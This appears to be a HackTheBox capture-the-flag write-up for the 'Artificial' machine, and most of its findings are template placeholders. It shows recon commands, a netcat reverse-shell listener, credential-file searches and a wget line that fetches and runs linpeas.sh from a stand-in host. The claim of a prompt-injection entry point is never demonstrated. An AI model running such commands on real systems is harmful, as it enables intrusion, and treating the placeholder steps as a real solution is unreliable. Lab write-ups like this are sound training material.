# 🤖 HackTheBox - Artificial

![Artificial Banner](picture1.png)

## 📋 Machine Information

| **Attribute** | **Details** |
|---------------|-------------|
| **Machine Name** | Artificial |
| **OS** | ![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black) |
| **Difficulty** | ![Easy](https://img.shields.io/badge/Easy-00D26A?style=flat) |
| **Machine Rating** | ⭐⭐⭐⭐⭐ 4.2/5 |
| **Release Date** | 📅 June 21, 2025 |
| **Created by** | 👤 [FisMatHack](https://app.hackthebox.com/profile/1076236) |
| **User Owns** | 👥 7,317 |
| **System Owns** | 🔑 6,002 |

## 🎯 Overview

Artificial is an Easy-rated Linux machine on HackTheBox that leverages **artificial intelligence** themes and technologies. This machine appears to be newly released (June 2025) and has gained significant attention from the community with thousands of successful solves.

> **💡 Key Learning Points:**
> - AI/ML related vulnerabilities
> - Linux privilege escalation
> - Web application security
> - Service enumeration and exploitation

![Machine Preview](picture2.png)

## 🔍 Reconnaissance

### Initial Nmap Scan

Let's start with a basic port scan to identify open services:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.x
```

![Initial Nmap Scan](picture3.png)

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

### Full Port Scan

Let's perform a comprehensive scan to ensure we don't miss any services:

```bash
nmap -p- --min-rate=1000 -T4 10.10.11.x
```

![Full Port Scan](picture4.png)

### Service Enumeration

#### HTTP Service (Port 80)

Let's explore the web application:

![Web Application Homepage](picture5.png)

**Directory Enumeration:**
```bash
gobuster dir -u http://10.10.11.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster Results](picture6.png)

**Technology Stack:**
```bash
whatweb http://10.10.11.x
```

![Whatweb Results](picture7.png)

**Wappalyzer Analysis:**

![Wappalyzer Technology Stack](picture8.png)

## 🚪 Initial Access

### Vulnerability Discovery

After exploring the web application, we discovered:

![Vulnerability Discovery](picture9.png)

**Key Findings:**
- 🔍 Interesting endpoint found: `/api/v1/`
- 🤖 AI model interaction interface
- 🔓 Potential input validation issues

### Exploitation

**Step 1: Analyzing the AI Interface**

![AI Interface Analysis](picture10.png)

**Step 2: Crafting the Payload**

![Payload Crafting](picture11.png)

```bash
# Example payload
curl -X POST http://10.10.11.x/api/v1/predict \
  -H "Content-Type: application/json" \
  -d '{"input": "malicious_payload_here"}'
```

**Step 3: Getting Shell Access**

![Shell Access](picture12.png)

```bash
# Reverse shell payload
nc -lvnp 4444
```

![Reverse Shell Connection](picture13.png)

### Initial Shell

```bash
whoami
id
pwd
ls -la
```

![Initial Shell Commands](picture14.png)

## 👤 User Flag

### User Enumeration

Let's explore the system and find user accounts:

```bash
cat /etc/passwd | grep -E "sh$|bash$"
ls /home/
```

![User Enumeration](picture15.png)

### Finding User Credentials

**Exploring Configuration Files:**

![Configuration Files](picture16.png)

**Database Exploration:**

```bash
find / -name "*.db" 2>/dev/null
find / -name "config*" 2>/dev/null
```

![Database Files](picture17.png)

### Lateral Movement

**Accessing User Account:**

![User Account Access](picture18.png)

### 🏆 User Flag

```bash
cat /home/username/user.txt
```

![User Flag](picture19.png)

**User Flag:** `HTB{user_flag_here}`

## 🔝 Privilege Escalation

### System Enumeration

**LinEnum/LinPEAS Execution:**

```bash
# Transfer enumeration script
wget http://your-ip:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![LinPEAS Results](picture20.png)

### Privilege Escalation Vector Discovery

**Sudo Permissions:**
```bash
sudo -l
```

![Sudo Permissions](picture21.png)

**SUID Binaries:**
```bash
find / -perm -4000 2>/dev/null
```

![SUID Binaries](picture22.png)

**Interesting Processes:**
```bash
ps aux | grep root
```

![Root Processes](picture23.png)

### Exploitation

**Method Used:** [Describe the privilege escalation method]

![Privilege Escalation Process](picture24.png)

**Payload Execution:**

![Payload Execution](picture25.png)

### Root Access Achieved

```bash
whoami
id
```

![Root Access](picture26.png)

## 🏁 Root Flag

### Root Directory Exploration

```bash
cd /root
ls -la
```

![Root Directory](picture27.png)

### 🏆 Root Flag

```bash
cat /root/root.txt
```

![Root Flag](picture28.png)

**Root Flag:** `HTB{root_flag_here}`

### Post-Exploitation

**System Information:**
```bash
uname -a
cat /etc/os-release
```

![System Information](picture29.png)

## 🎓 Lessons Learned

### 🔍 Key Takeaways

1. **AI/ML Security Considerations**
   - AI models can be vulnerable to prompt injection attacks
   - Input validation is crucial in AI-powered applications
   - Model responses can leak sensitive information

2. **Web Application Security**
   - Always enumerate all endpoints and API routes
   - Check for hidden functionality in AI interfaces
   - Validate all user inputs properly

3. **Linux Privilege Escalation**
   - Regular enumeration is key to finding privilege escalation vectors
   - Check for misconfigured services and permissions
   - Always verify sudo permissions and SUID binaries

### 🛡️ Defensive Measures

- Implement proper input validation for AI models
- Use principle of least privilege
- Regular security audits of AI applications
- Monitor for unusual API usage patterns

![Security Recommendations](picture30.png)

## 🔧 Tools Used

| **Category** | **Tools** | **Purpose** |
|--------------|-----------|-------------|
| **Reconnaissance** | ![Nmap](https://img.shields.io/badge/Nmap-4682B4?style=flat) | Port scanning and service enumeration |
| | ![Gobuster](https://img.shields.io/badge/Gobuster-FF6B6B?style=flat) | Directory and file enumeration |
| | ![Whatweb](https://img.shields.io/badge/Whatweb-4ECDC4?style=flat) | Web technology identification |
| **Exploitation** | ![Burp Suite](https://img.shields.io/badge/BurpSuite-FF7F00?style=flat) | Web application testing |
| | ![cURL](https://img.shields.io/badge/cURL-073551?style=flat) | HTTP requests and API testing |
| | ![Netcat](https://img.shields.io/badge/Netcat-2F4F4F?style=flat) | Reverse shell listener |
| **Privilege Escalation** | ![LinPEAS](https://img.shields.io/badge/LinPEAS-98D8C8?style=flat) | Linux enumeration script |
| | ![GTFOBins](https://img.shields.io/badge/GTFOBins-FF69B4?style=flat) | Unix binary exploitation reference |

![Tools Overview](picture31.png)

## 📊 Attack Chain Summary

```mermaid
graph TD
    A[Port Scanning] --> B[Web Enumeration]
    B --> C[AI Interface Discovery]
    C --> D[Prompt Injection]
    D --> E[Initial Shell]
    E --> F[User Enumeration]
    F --> G[Credential Discovery]
    G --> H[User Flag]
    H --> I[Privilege Escalation]
    I --> J[Root Access]
    J --> K[Root Flag]
```

![Attack Chain](picture32.png)

## 📝 Additional Screenshots

### Detailed Analysis Screenshots

![Detailed Analysis 1](picture33.png)
![Detailed Analysis 2](picture34.png)
![Detailed Analysis 3](picture35.png)

### Alternative Methods

![Alternative Method 1](picture36.png)
![Alternative Method 2](picture37.png)

### Cleanup and Persistence

![Cleanup Process](picture38.png)

### Final System State

![Final System State](picture39.png)

---

## 📚 References

- [HackTheBox Machine Page](https://app.hackthebox.com/machines/Artificial)
- [OWASP AI Security and Privacy Guide](https://owasp.org/www-project-ai-security-and-privacy-guide/)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

![References](picture40.png)

![Completion Badge](picture41.png)

---

> **⚠️ Disclaimer:** This writeup is for educational purposes only. Always ensure you have proper authorization before testing security tools and techniques. The author is not responsible for any misuse of the information provided.

**🎯 Machine Completed:** `$(date)`
**⏱️ Total Time:** `X hours Y minutes`
**🏆 Flags Captured:** `2/2`